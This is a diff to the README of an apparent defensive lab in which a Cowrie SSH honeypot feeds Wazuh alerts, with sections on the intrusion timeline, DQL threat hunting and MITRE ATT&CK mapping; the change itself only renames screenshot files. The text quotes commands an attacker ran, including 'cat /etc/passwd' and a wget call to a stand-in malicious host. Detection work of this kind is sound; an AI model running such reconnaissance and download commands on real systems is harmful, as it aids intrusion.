@@ -43,17 +43,17 @@ Wazuh Manager was configured to monitor the `cowrie.json` telemetry file via the
 ### 1. Full Intrusion Timeline (Initial Access to Session Close)
 Wazuh captured the entire lifecycle of the attacker's session, from initial SSH handshake (`Rule 100100`) and unauthorized shell login (`Rule 100102`, Level 10) to session termination:
 
-![Full Intrusion Timeline](screenshots/01-full-timeline.png)
+![Full Intrusion Timeline](screenshots/01-full-timeline.jpeg)
 
 ### 2. Threat Hunting & Critical Command Filtering (DQL)
 Using Wazuh's DQL search bar (`cowrie.command.input`), high-severity alerts (`Level 12`, `Rule 100103`) were isolated to inspect the exact commands executed by the adversary (`whoami`, `cat /etc/passwd`, and `wget http://malicious.site`):
 
-![Filtered Critical Alerts](screenshots/02-wazuh-alerts.png)
+![Filtered Critical Alerts](screenshots/02-wazuh-alerts.jpeg)
 
 ### 3. Deep-Dive Event Inspection & MITRE ATT&CK Mapping
 Expanding the critical **Level 12 (`Rule 100103`)** alert confirms the log source (`/var/log/cowrie/cowrie.json`) and automatically maps the malicious execution behavior to **`T1059` (*Command and Scripting Interpreter*)**:
 
-![MITRE Details](screenshots/03-mitre-details.png)
+![MITRE Details](screenshots/03-mitre-details.jpeg)
 
 ---
 
